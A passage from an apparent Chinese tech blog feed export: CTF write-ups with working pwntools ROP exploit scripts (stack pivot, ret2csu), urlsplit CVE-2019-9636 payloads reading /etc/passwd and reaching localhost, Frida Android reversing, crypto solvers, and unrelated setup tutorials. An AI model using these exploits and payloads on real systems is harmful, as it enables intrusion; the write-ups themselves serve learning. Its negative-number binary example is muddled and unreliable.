# mov eax, [eax]; ret add_eax_ebx = 0x080488c7 # add eax, ebx; ret call_eax = 0x080486a3 # call eax xchg_eax_esp = 0x080488c2 # xchg eax, esp; ret p.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ") heap = int(p.recv(10), 16) # 获得程序打印出来的heap地址 也就是我们第一次写入的内容地址. payload = b"" payload += p32(foothold_plt) payload += p32(pop_eax) + p32(foothold_got) + p32(mov_eax_eax) payload += p32(pop_ebx) + p32(offset) payload += p32(add_eax_ebx) payload += p32(call_eax) p.sendline(payload) payload = b"A" * overflow payload += p32(pop_eax) + p32(heap) payload += p32(xchg_eax_esp) # 让eax和esp两个寄存器交换内容 p.sendline(payload) p.interactive() 真实题目:Black Watch 入群题 PWN 64位:和32位差不多 # coding:utf-8 from pwn import * elf = ELF("./pivot") libc = ELF("./libpivot.so") p = process("./pivot") # var foothold_plt = elf.plt['foothold_function'] foothold_got = elf.got['foothold_function'] foothold_sym = libc.symbols['foothold_function'] ret2win = libc.symbols['ret2win'] offset = ret2win - foothold_sym mov_rax_rax = 0x0000000000400b05 pop_rax_ret = 0x0000000000400b00 call_rax =0x00000000040098e add_rax_rbp = 0x00000000000400b09 pop_rbp = 0x0000000000400900 xchg_rax_rsp = 0x0000000000400b02 p.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ") heap = int(p.recv(14),16) p.recvuntil("> ") payload1 = p64(foothold_plt) payload1 += p64(pop_rax_ret) payload1 += p64(foothold_got) payload1 += p64(mov_rax_rax) payload1 += p64(pop_rbp) payload1 += p64(offset) payload1 += p64(add_rax_rbp) payload1 += p64(call_rax) p.sendline(payload1) p.recvuntil("> ") payload2 ='a'*(0x20+0x08) payload2 += p64(pop_rax_ret) payload2 += p64(heap) payload2 += p64(xchg_rax_rsp) p.sendline(payload2) p.recvuntil("into libpivot.so") p.interactive() ret2csu64位:程序要求我们callret2win这个函数, 同时rdx寄存器要放入0xdeadcafebabebeef. 通过ROPgadget并没有找到pop rdx; ret之类的, 但是从IDA进行分析, 可以看到__libc_csu_init函数中, 有pop r15和mov rdx, r15之类的, 可以间接进行赋值. from pwn import * p = process("./ret2csu") # var init_addr = 0x0600E10 mov_rdx_r15 = 0x0000000000400880 pop_rbx = 0x000000000040089A ret2win = 0x00000000004007B1 p.recvuntil('> ') payload = b"A" * 0x28 payload += p64(pop_rbx) payload += p64(0) # pop rbx payload += p64(1) # pop rbp 填写1因为0x400880那串里面有一个add rbx, 1; 再往后有一个cmp, 如果不填写1就又跳回来了. payload += p64(init_addr) # pop r12 如果不init, setvbuf会将edx填写为0xffffffff payload += p64(0) # pop r13 payload += p64(0) # pop r14 payload += p64(0xdeadcafebabebeef) # pop r15 payload += p64(mov_rdx_r15) # ret payload += p64(0) payload += p64(0) # rbx payload += p64(0) # rbp payload += p64(0) # r12 payload += p64(0) # r13 payload += p64(0) # r14 payload += p64(0) # r15 payload += p64(ret2win) # ret p.sendline(payload) p.interactive() 如果不理解可以通过IDA+Pwntools远程调试, 看清楚栈中数据, 就会理解了。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 3.7.2 urllib.parse.urlsplit 漏洞分析]]></title>
    <url>%2F2020%2F05%2F27%2F13-Python-3-7-2-urlsplit-cve%2F</url>
    <content type="text"><![CDATA[Python 3.7.2的urllib.parse模块下urlsplit错误的处理字符导致漏洞。 漏洞原理用 Punycode/IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 URL。 例如，在直接比较中, \uFF03不等于＃，而是统一化为＃，这会更改 URL 的片段部分。 类似地，\u2100 统一化为a/c，它引入了路径段。 ℅解析为c/o℆解析为c/u CTF例子[SUCTF 2019]Pythonginx题目链接: Pythonginx这个题目通过构造℆ 使其构造为?url=file://suctf.c℅pt/../etc/passwd, 以此解析成suctf.cc/opt/../etc/passwd, 就可以看到/etc/passwd的内容. [SharkyCTF]Aqua World题目链接: Aqua World这个题目需要以本地的地址访问到这个网站, 题目也提示了要使urlsplit后的netloc为本地地址, 然后通过F12查看服务器的Python版本是3.7.2 这个网站存在一个anonymous的登录, 尝试分割这个url, 参考CVE-2019-9636, 可以得到 继续参考, 可以看到一个例子: >>> u = "https://example.com\uFF03@bing.com" >>> urlsplit(u).netloc.rpartition("@")[2] bing.com 于是我们尝试http://anonymous:anonymous@aquaworld.sharkyctf.xyz/admin-query?flag=flag根据上面的例子进行更改, 为 http://anonymous:anonymous@aquaworld.sharkyctf.xyz/admin-query\uFF03@localhost?flag=flag 发送payload! 可以看到netloc已经被更改了, 但是没有得到flag, 于是更改payload的localhost为127.0.0.1, 再次进行尝试. 修复官方解决办法是, 遇到这几个特殊字符直接抛出Value Error 参考资料CVE-2019-9636：urlsplit 不处理 NFKC 标准化 CVE-2019-10160：urlsplit NFKD 标准化漏洞]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>CVE</tag>
        <tag>URLSPLIT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020网鼎杯 安卓逆向 bang]]></title>
    <url>%2F2020%2F05%2F11%2F12-wangdingCUP-bang-reverse%2F</url>
    <content type="text"><![CDATA[参加了一下网鼎杯, 太难了…QAQ, 赛后根据大佬的思路重新做了一遍题目, 记录一下… Setup Python3 Jadx-GUI Frida (python -m pip install frida-tools) Frida-server Frida-DEXDump ADB 安卓模拟器(推荐夜神安卓模拟器) Go?0x01将题目先安装进模拟器, 然后运行起来. 0x02将adb连接到模拟器, adb connect 127.0.0.1:62001, 看到success就代表连接成功了. 0x03将适合自己模拟器系统的frida-server放入模拟器里.把下载的frida-server也就是frida-server-12.8.20-android-x86.xz,解压成为frida-server-12.8.20-android-x86(因为我的夜神模拟器里是x86架构的.) 可以如下命令查看手机版本 adb shell getprop ro.product.cpu.abi将解压后的文件push到手机里面、加执行权限、并运行。 adb push frida-server-12.8.20-android-x86 /data/local/tmp/frida-server adb shell cd /data/local/tmp chmod 775 frida-server ./frida-server 之后再开一个cmd窗口, 将端口转发到本机 adb forward tcp:27042 tcp:27042 adb forward tcp:27043 tcp:270430x04检查是否成功 frida-ps -U 如果你和我一样, 那么恭喜. 0x05这时找到Frida-DEXDump, 运行python main.py就dump出了想要的内容. 再使用JADX-GUI, 打开得到的.dex文件, 就可以看到. 还是太菜了…]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Reverse</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang 垃圾回收剖析]]></title>
    <url>%2F2020%2F03%2F10%2F11-Golang-Gc%2F</url>
    <content type="text"><![CDATA[这一小节介绍三种经典的 GC 算法：引用计数（reference counting）、标记-清扫（mark &amp; sweep）、节点复制（Copying Garbage Collection），分代收集（Generational Garbage Collection）。 直接看大佬的文章, 讲的超级超级详细！！！Golang 垃圾回收剖析Golang 垃圾回收剖析Golang 垃圾回收剖析]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>Gc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ElasticSearch Centos7安装教程]]></title>
    <url>%2F2020%2F02%2F14%2F10-ElasticSearch-Quick-Start%2F</url>
    <content type="text"><![CDATA[ElasticSearch是一个采用Java语言编写搜索服务器，提供了一个分布式多用户的全文搜索引擎，能够达到实时搜索，稳定，可靠，快速，安装使用方便。 环境说明Centos7必须能连接互联网 [root@localhost ~]# cat /etc/redhat-release CentOS Linux release 7.7.1908 (Core) Xshell用来连接Centos主机. 没有的话直接用系统自带的SSH也可以。 安装ElasticSearch前置任务 (雾)由于es不支持以root用户运行，所以需要创建一个普通用户 [root@localhost ~]# useradd elasticuser 在自己喜欢的目录创建一个es的下载文件夹. 我选择/usr/es [root@localhost ~]# mkdir -p /usr/es 因为是用root用户创建的文件夹, elasticuser用户没有权限，所以要更改文件夹的权限 [root@localhost usr]# chown elasticuser:elasticuser es/ -R 切换成elasticuser用户进行下面的操作 [root@localhost usr]# su elasticuser [elasticuser@localhost usr]$ whoami elasticuser 准备任务 (大雾)下载es [elasticuser@localhost usr]$ cd es [elasticuser@localhost es]$ wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.6.0-linux-x86_64.tar.gz 解压 [elasticuser@localhost es]$ ls elasticsearch-7.6.0-linux-x86_64.tar.gz [elasticuser@localhost es]$ tar zxvf elasticsearch-7.6.0-linux-x86_64.tar.gz 修改配置文件 config/jvm.options (非必须, 目的是调整内存占用少一些) -Xms512m -Xmx512m config/elasticsearch.yml (重要, 调整不好会导致ElasticSearch启动失败) 不要直接复制粘贴, yml格式不允许写注释. network.host: 0.0.0.0 // 修改完毕后可以外网访问 cluster.name: "centos-cluster" // 不改就启动起来提示Warning node.name: "node-1" // 不改就启动起来提示Warning discovery.seed_hosts: ["127.0.0.1", "[::1]"] // 不改就启动起来提示Warning cluster.initial_master_nodes: ["node-1"] // 不改就启动起来提示Warning 尝试启动ElasticSearch. [elasticuser@localhost elasticsearch-7.6.0]$ ./bin/elasticsearch 不失众望的报错了, 查看一下报错: 解决错误 ([1])遇到错误不慌， 一个个解决，首先是第一个 [1]: max file descriptors [4096] for elasticsearch process is too low, increase to at least [65535] 更改/etc/security/limits.conf, 这个时候要使用root用户更改, 写入以下内容 * soft nofile 65535 * hard nofile 65535写完是这样的 接着重启一下服务器. 继续解决下一个bug. 解决错误 ([2])重启完， 先看看第一个错误解决了没有 [root@localhost ~]# ulimit -Hn 65535 [root@localhost ~]# ulimit -Sn 65535 发现两个返回都是65535，就证明修改生效了。 然后看下一个报错 [2]: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144] 修改/etc/sysctl.conf， 添加 vm.max_map_count=262144 保存退出 并 执行 [root@localhost bin]# sysctl -p vm.max_map_count = 262144 再切换成elasticuser用户, 去运行es. 可以看到运行成功了, 使用浏览器去访问http://&lt;centos的IP地址&gt;:9200 emm 无法访问… 因为Centos默认开启了防火墙. 可以直接关闭防火墙 (启停服务需要root用户) [root@localhost bin]$ systemctl stop firewalld.service 再重新运行es. ok, 安装完毕, 接下来就可以正常学习和使用ElasticSearch了。 就这样！]]></content>
      <categories>
        <category>Linux</category>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ES</tag>
        <tag>ElasticSearch</tag>
        <tag>Centos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下配置Flutter运行开发环境]]></title>
    <url>%2F2019%2F12%2F19%2F9-Windows-Set-FlutterDev%2F</url>
    <content type="text"><![CDATA[Windows下设置Flutter的运行开发环境. 说实话, 看到移动平台的开发就觉得很麻烦，还好这次Flutter没让我太过于失望。 下载必要的软件 GIt For Windows Git工具, 在windows下的客户端. Java Java JDK8 Android Studio 是为了安装SDK. Flutter 肯定是下载最新版本啦. VS Code 超级轻量的代码编辑器 设置环境变量Java设置环境变量将JDK的安装目录放入环境变量 key: JAVA_HOME value: D:\Software\Java\jdk1.8.0_231 看个人情况. Flutter设置环境变量将下载的Flutter SDK解压, 放入没有中文，没有空格的目录下, 设置环境变量将Flutter放入系统变量key: FLUTTER_HOME value: D:\LearningMaterials\flutter然后设置PATH: %FLUTTER_HOME%\bin 即可. VSCode安装插件 Dart Flutter 检查运行环境doctorcmd下运行flutter doctor会自动诊断当前的环境是否有异常 emulatorscmd下运行flutter emulators会列出当前可用的Android和IOS设备.通过运行flutter emulators --launch &lt;emulator id&gt;指定列出的设备名, 即可打开设备. runcmd在代码根目录运行flutter run即可在运行的设备中打开APP, 不过第一次可能会出现未license的错误, 可以运行flutter doctor --android-licenses, 根据提示全部按y, 结束后再次flutter run即可成功运行. 学习…学习…]]></content>
      <categories>
        <category>Flutter</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Flutter</tag>
        <tag>Windows</tag>
        <tag>IOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF 密码学思路WriteUP]]></title>
    <url>%2F2019%2F12%2F03%2F8-BUUCTF-Crypto-WriteUP%2F</url>
    <content type="text"><![CDATA[BUUCTF, 自己学习的过程中思路记录, 以及flag… (目的是记录自己的思路和想法！！！) 题目地址: BUUCTF MD5直接拿去SOMD5解密flag{admin1} 看我回旋踢ROT13解密, 直接在线工具.flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1} Url编码用Hackbar之类的工具进行URL解码flag{and 1=1} 摩丝这可不是丝wa… 用工具直接解摩斯电码吧.工具: 摩尔斯电码解密flag{iloveyou} 一眼就解密打开F12, 在Console中输入 atob("ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=") flag{THE_FLAG_OF_THIS_STRING} 变异凯撒没思路先写脚本穷举, 发现从ascii+5开始依次出现flag关键字, 于是写脚本进行解密. cipher = "afZ_r9VYfScOeO_UL^RWUc" index = 0 for num in range(5, len(cipher) + 5): temp = "" for i in cipher: temp += chr(ord(i) + num) print(temp[index], end="") index += 1 flag{Caesar_variation} Quoted-printable工具题，没意义，也没难度，知道有这种编码就会解.在线工具flag{那你也很棒哦} password社工题目, 之前做过类似的, 知道规律就行, 没什么难度. (别问为什么, 这就是CTF)flag{zs19900315} zip伪加密感觉不应该是密码学, 应该是Misc题目.使用WinHex把压缩包打开, 将Hex的, 50 4B 03 04 14 00 09 00改成50 4B 03 04 14 00 00 00, 保存再去解压, 就会发现可以正常解压了.flag{Adm1N-B2G-kU-SZIP} RSA稍微了解一下RSA加密算法就知道d怎么求了, 直接上py脚本. import libnum p = 473398607161 q = 4511491 e = 17 print(libnum.invmod(e, (p - 1) * (q - 1))) flag{125631357777427553} Rabbit看题目就知道是什么加密, 直接找在线工具.flag{Cute_Rabbit} 丢失的MD5给了一个Python脚本, 脚本是Python2的, 直接运行得到Flag. (目的是了解MD5爆破)flag{e9032994dabac08080091151380478a2} 篱笆墙的影子栅栏密码, 选择2栏, 进行加密操作, flag直接出. (注意是加密, 不是解密)flag{wethinkwehavetheflag} Alice与Bob通过在线工具进行质因数分解, 得到两个素数, 根据题目, 将小素数放在前面, 大素数放在后面, 拼接, 进行md5 32位的加密.flag{d450209323a847c8d01c6be47c81811a} rsarsa需要了解RSA的加密过程, 才会知道解密过程, 背脚本是没有意义的。建议去看看RSA原理, 推荐几个我看过的教程.RSA-1RSA-2 看完上面两个绝对会RSA基础题目解密了.上Python脚本!! import libnum p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 e = 65537 c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 d = libnum.invmod(e, (p-1)*(q-1)) result = pow(c, d, p*q) print(result) flag{5577446633554466577768879988} 传统知识+古典密码？这什么沙雕题目，如果看不懂辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳， +甲子就GG.得出: XZSDMFLZ然后进行古典密码解密, 先4栏栅栏, 再偏移21位凯撒, 即可得出FLagflag{SHUANGYU} 大帝的密码武器说实话, 这个题目一开始我没怎么看明白, 后来找到规律就好办了.先将FRPHEVGL进行ASCII爆破, 看题目说会出现有意义的单词, 就每次爆破的时候, ASCII大于z的时候， 将当前字母的ASCII码进行-26操作, 爆破发现13是有意义SECURITY的, 直接上脚本. cipher = "FRPHEVGL" # 已知的密文 result = "SECURITY" # 第一步找到的有意义单词 secert = 13 # 第二步找到的有意义偏移量 t = "ComeChina" # 需要解密的密文 # 1. 爆破具体是位移多少位才是有意义的. for i in range(26): for j in cipher: temp = ord(j) + i if temp > ord("Z"): temp -= 26 print(chr(temp), end="") print() # 2. 找规律, 发现都是根据13来的. temp = [] for i, j in zip(cipher, result): i = ord(i) j = ord(j) if i > j: temp.append(j - i) else: temp.append(j - i) print(temp) # 3. 根据题目规律爆破, 超过z就-26, 即可得到Flag for i in t: t = ord(i) + secert if t > ord("z"): t -= 26 print(chr(t), end="") flag{PbzrPuvan} Windows系统密码下载下来附件拿去Kali使用John工具进行解密. john pass.hash john --show --format=LM pass.hash 有点坑, 要小写.flag{good-luck} RSA1已知dp,dq求解: 题目给了dp, dq, 需要去了解一下dp,dq是什么, 然后直接脚本做题. import libnum import binascii def decrypt(dp,dq,p,q,c): InvQ = libnum.invmod(q,p) mp = pow(c,dp,p) mq = pow(c,dq,q) m=(((mp-mq)*InvQ)%p)*q+mq print (binascii.unhexlify(hex(m)[2:])) flag{W31c0m3_70_Ch1n470wn} RSA3题目给了两个c, 两个e, 一个n, 典型的RSA共模攻击, 直接一把梭. import libnum import binascii def RSACommonMode(n, c1, c2, e1, e2): def egcd(a, b): if b == 0: return a, 0 else: x, y = egcd(b, a % b) return y, x - (a // b) * y s = egcd(e1, e2) s1 = s[0] s2 = s[1] if s1 &lt; 0: s1 = - s1 c1 = libnum.invmod(c1, n) elif s2 &lt; 0: s2 = - s2 c2 = libnum.invmod(c2, n) m = pow(c1, s1, n) * pow(c2, s2, n) % n print(binascii.unhexlify(hex(m)[2:])) flag{49d91077a1abcb14f1a9d546c80be9ef} 凯撒？替换？呵呵!一堆看不懂的乱码, 扔去quipqiup进行字符频率统计, 就可以得到flag了. 大坑, 空格要删除掉.flag{substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake} 权限获得第一步得到了一个txt, 里面是Windows SAM的内容, 格式是: UserName:ID:HASH:HASH:::, 将最后一段HASH去md5在线破解搜出来就是flagflag{3617656} 萌萌哒的八戒从网上找个猪圈密码对照表, 一个一个对照出来就可以了.flag{whenthepigwanttoeat} 世上无难事一堆看不懂的, 扔去词频分析, 得到flag, 但是提交的时候需要全小写.flag{640e11012805f211b0ab24ff02a1ed09} robomunication是一段音频, 听了一下感觉像是摩斯电码, 放到Audacity分析.flag{BOOPBEEP} 异性相吸key文件中一一对asdasdad之类的, 密文则是一段乱码, 猜可能是把asdasd的ascii码拿来对应密文进行异或.写个脚本 with open("key.txt", "r") as key: with open("密文.txt", "r") as cipher: keyData = key.read() cipherData = cipher.read() for i, j in zip(keyData, cipherData): print(chr(ord(i) ^ ord(j)), end="") flag{ea1bc0988992276b7f95b54a7435e89e} 还原大师给了个残缺的原文, 残缺的md5, 但是提示原文缺失的是大写字母, 那就简单了, 写个脚本爆破出来 import string import hashlib sSet = string.ascii_uppercase for i in sSet: for j in sSet: for k in sSet: m = f"TASC{i}O3RJMV{j}WDJKX{k}ZM" md5 = hashlib.md5() md5.update(m.encode("utf-8")) result = md5.hexdigest().upper() if result[:4] == "E903": print(result) print(m) flag{E9032994DABAC08080091151380478A2} 传感器没头绪, 不争气的去搜了搜wp, 原来是曼彻斯特编码, 那没事了.网上大佬的脚本 cipher='5555555595555A65556AA696AA6666666955' def iee(cipher): tmp='' for i in range(len(cipher)): a=bin(eval('0x'+cipher[i]))[2:].zfill(4) tmp=tmp+a[1]+a[3] print(tmp) plain=[hex(int(tmp[i:i+8][::-1],2))[2:] for i in range(0,len(tmp),8)] print(''.join(plain).upper()) iee(cipher) flag{FFFFFED31F645055F9} Cipher在线工具解出flag{itisnotaproblemhavefun} RSAROLL就是简单的RSA, 密文很多. 写个脚本就可以了. import libnum # {920139713,19} n = 920139713 p = 18443 q = 49891 e = 19 d = libnum.invmod(e, (p-1)*(q-1)) with open("data.txt", "r") as fp: for i in fp.readlines(): c = i.strip() print(chr(pow(int(c),d,n)), end="") flag{13212je2ue28fy71w8u87y31r78eu1e2} [BJDCTF 2nd]rsa0挺简单的, 给了p+q和p-q的结果, 用幼儿园数学就可以解出来.写个脚本 import libnum p_q = 23739288354455618823500789320882015507916235495298919211105643329075951209068787630098346460475927331769393616566728637534240820048596719327537779749309942 p__q = 948302319808573594690404166522167040466682672257436846156503266017624344686672560965640249175574642110944426131051410227570706455318246794290130811495220 q = (p_q - p__q) // 2 p = p_q - q n = p * q e = 14319223 d = libnum.invmod(e, (p-1)*(q-1)) c=15149744517033579581121079919371536543625764309178093114222222083997624880804403990685225551641742250133869348431666895839971706066083354772440919051386874078900267911498803910425195536370033292591575354103143983614210191790171674997710390856232217787490303852272027717390320852706104910007664891405492668536 m = str(hex(pow(c,d,n)))[2:] for i in range(0, len(m), 2): print(chr(int(m[i:i+2], 16)), end="") flag{21c569ae-3068-4b9f-97f1-784ab48863d9} 刷到什么题就更新。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>BUUCTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手算正反十进制转换二进制过程]]></title>
    <url>%2F2019%2F10%2F28%2F7-Dec-to-Bin-Calc%2F</url>
    <content type="text"><![CDATA[学习一下手算十进制到二进制, 包括正数和负数转换二进制. 十进制正数 转换 二进制 除以2的整数结果除以2到0为止. 结果从下往上看. Example: 把9计算成2进制. 9 9/2 = 4 -&gt; 1 ; 9/2=4.5 把小数点忽略, 就是4, 因为有小数点, 所以这个位置就是1. 4/2 = 2 -&gt; 0 ; 4/2=2 没有小数点, 这个位置就是0. 2/2 = 1 -&gt; 0 ; 结果等于1的时候还要进行除. 1/2 = 0 -&gt; 1 ; 结果为0的时候才能结束, 1/2=0.5, 有余数, 所以为1. 从下向上看, 排序1001, 这个计算的结果从上到下和从下到上都一样... Example: 把27计算2进制. 27 27/2 = 13 -&gt; 1 13/2 = 6 -&gt; 1 6/2 = 3 -&gt; 0 3/2 = 1 -&gt; 1 1/2 = 0 -&gt; 1 结果是: 0001 1011 十进制负数 转换 二进制 计算负数绝对值的二进制结果. 将第一步计算的结果进行取反. 取反后+1, 就是最终结果 64位的, 计算的内容前面填充1. Example: 把-9转换二进制9 9/2 4 1 4/2 2 0 2/2 1 0 1/2 0 1 源码: 1001反码: 0110补码: 反码 + 1 : 0111 结果: 0111 - Example: 把-15转换二进制1515/2 7 17/2 3 13/2 1 11/2 0 1 源码: 1111反码: 0000补码: 0001 结果: 0001``` 其他数计算都是这个步骤, 去尝试一下吧~]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>进制转换</tag>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nim编程语言快速入门 (附代码例子)]]></title>
    <url>%2F2019%2F10%2F03%2F6-Nim-Programming-Language%2F</url>
    <content type="text"><![CDATA[Nim是一种静态类型编译的系统编程语言, 它结合了其他成熟语言的成功概念, 这次就带你5分钟学会Nim的编写, 来跟我一起尝试一下吧. Nim官网: https://Nim-lang.org/Nim中文社区: https://Nim-lang-cn.org/ 前言花了半小时的时间去试了试这门语言, 可以通过Nim生成js或者c的代码以及可执行文件, 感觉蛮酷的, 做个分享. 基础Nim编译出一个exe文件是这么做的: Nim c main.Nim Nim 编译出一个js文件是这么做的: Nim js main.Nim 发没发现? 只需要更改Nim 中的内容就可以了. 不过, 你无法编译成”世界上最好的语言”, 比如Nim php main.Nim, 会报错的！！ 超级详细带代码体验定义变量基本变量类型# 指定类型 var name: string = "HelloWorld" # 类型推断 var i = 10 列表(数组)var list = @[1,2,3,4,5] 加上@符号表明是动态数组, 可以进行Add和POP操作. Table(在Py叫Dict, Go叫Map)import tables var dict = {"one": "HeliantHuS"}.toTable # 取值 echo dict["one"] # HeliantHuS 注释# 打印HelloWorld echo "HelloWorld" Nim中的注释和Python一样. 判断case-ofvar name: string = readLine(stdin) # case就等于其他语言的switch, of就相当于case case name of "": echo "你不可以输入空的哦." of "HeliantHuS": echo "HeliantHuS is Handsome" else: echo "我没看懂你输入的是什么" if-elif-elseimport strformat var name: string = readLine(stdin) if name == "HeliantHuS": echo fmt"Hello, {name}" elif name == "exit": echo "Exit!!!" else: echo "没有匹配~" 循环whilewhile 没什么好说的, Python有的它也有. while true: echo "Hello" forfor i in countup(1, 10): echo i for i in 1..10: echo i 上面两段代码效果一样, 可以看出来比Python还要简洁. 函数定义一个函数import strformat proc hello(name: string): string = return fmt"Hello, {name}" 调用函数var result = hello("HeliantHuS") echo result 舍弃函数返回值discard hello("HeliantHuS") 在Nim中, 函数必须要有返回值, 你就必须要去用变量去接收或者直接echo, 不然会报错, 有时候函数的返回值也许不重要, 就需要去舍弃, 就要用关键字discard去舍弃. 作用域blockblock hello: echo "HelloWorld" Nim中也是使用缩进进行作用域的区分. 道理我都懂, 可我好像真的对你着迷.]]></content>
      <categories>
        <category>Nim</category>
      </categories>
      <tags>
        <tag>Nim</tag>
        <tag>元编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx反向代理骚操作详解]]></title>
    <url>%2F2019%2F10%2F03%2F5-Nginx-Config-ServerName%2F</url>
    <content type="text"><![CDATA[Nginx是一个的静态文件和反向代理服务，轻量，方便部署，而且性能极高.看完这篇文章, 你将点亮NGINX配置虚拟主机, 反向代理等技能点. 深入浅出worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root html; index index.html index.htm; } } } 上面这是一个nginx最基本的配置, 分http代码块, server代码块, 其中今天要玩的就是server这个代码块. 开始操作首先在nginx的静态文件夹保证有两个html文件, 分别为index.html、page1.html, 里面的内容自己随便写, 只要能分清楚是哪个文件就好. 正常启动正常启动Nginx, 访问通过服务器地址访问, 会访问到index.html的内容. 虚拟主机第一个server代码块不需要更改, 下面紧接着添加: server { listen 80; server_name page1.com; location / { root html; index page1.html; } } 这样, 只要访问这个服务器的时候，请求头的Host键内容为page1.com, 可以通过抓包或者修改hosts文件的方式来达到目的. 反向代理第二个server代码块不需要更改, 修改第一个server代码块的内容为: server { listen 80; server_name localhost; location / { proxy_pass http://hls.easy.echosite.cn/; } } 重启服务器, 访问localhost或者服务器真实IP, 你会发现, 显示的结果是你输入的http://hls.easy.echosite.cn的内容, 但是浏览器的URL依旧是localhost或服务器IP. 防盗链配置原理: 通过nginx的if判断, 只允许通过合法的域名访问本网站, 其余的域名访问本网站的时候直接返回403。 server { listen 80; server_name youdoamin.com; if ($host !~* ^youdomain.com$) { return 403; } location / { root html; index index.html index.htm; } } 临了, 最后的配置文件样子: 其实Nginx还有很多脚本类的东西, 太过深入就需要自己去研究了, NGINX一般还是作为接入层的反向代理去使用, 配置方便, 也轻量, 真的是做WEB必备的反向代理服务. 最后~ 文章中演示的hls.easy.echosite.cn是使用EchoSite2.0 内网穿透，就选他了！所内网穿透用来测试的, 如果有需要内网穿透的可以了解一下.]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>HTTP</tag>
        <tag>Proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fabric Python远程部署利器]]></title>
    <url>%2F2019%2F10%2F01%2F4-Fabric-Python-Remote-deploy%2F</url>
    <content type="text"><![CDATA[Fabric是一个Python的第三方库，可以进行Linux的远程部署，批量执行各种命令，况且，机器出错的次数比你少多了呢。(附详细的SSH免密登录过程) 环境介绍 Windows10的WSL IP: 192.168.1.66 下面简称物理机. VMware Centos服务器 IP: 192.168.1.40 下面简称服务器. 准备工作 Python3 类Linux操作系统 | 没有Linux用Windows的WSL也可以. 技术难点 SSH免密登录. 深入浅出SSH免密使用ssh-keygen命令在物理机生成公钥和私钥, 生成完毕后在当前登录的用户目录下.ssh文件夹下. 在服务器中的.ssh文件夹下创建一个名为authorized_keys文件并设置权限为600. cd ~/.ssh touch authorized_keys chmod 600 authorized_keys 将物理机的id_rsa.pub里面的内容复制进服务器新建的authorized_keys中.可以使用scp命令，将id_rsa.pub文件发送到服务器中，然后使用cat命令将id_rsa.pub的内容追加到authorized_keys文件中.物理机: scp ~/.ssh/id_rsa.pub root@192.168.1.40:~/.ssh/ 服务器: cat id_rsa.pub &gt;&gt; authorized_keys 使用物理机远程SSH连接服务器验证是否免密成功 安装Fabric在物理机执行下面的安装命令即可安装完毕. python3 -m pip install fabric 找一个空的目录新建名为fabfile.py的文件. 编写Fabric脚本使用vim编辑刚刚新建的py文件. from fabric import Connection, task @task def devploy(c): with Connection("root@192.168.1.40") as c: c.run("ifconfig") 写入完毕后保存，运行fab deploy即可看到服务器的执行回显. 可以用来一键替换更新yum源, 代码如下: from fabric import Connection, task @task def deploy(c): with Connection("root@192.168.1.40") as c: c.run('cd /etc/yum.repos.d/ &amp;&amp; \ mv CentOS-Media.repo CentOS-Media.repo.backup &amp;&amp; \ wget http://mirrors.163.com/.help/CentOS7-Base-163.repo &amp;&amp; \ yum clean all &amp;&amp; \ yum makecache &amp;&amp; \ yum update') 不是不愿意学习新的东西, 而是想知道学习这个能做什么, 加油.]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fabric</tag>
        <tag>远程部署</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nessus系统漏洞扫描平台(VMware傻瓜式安装)]]></title>
    <url>%2F2019%2F09%2F30%2F3-Nessus-Install-or-Use-and-License%2F</url>
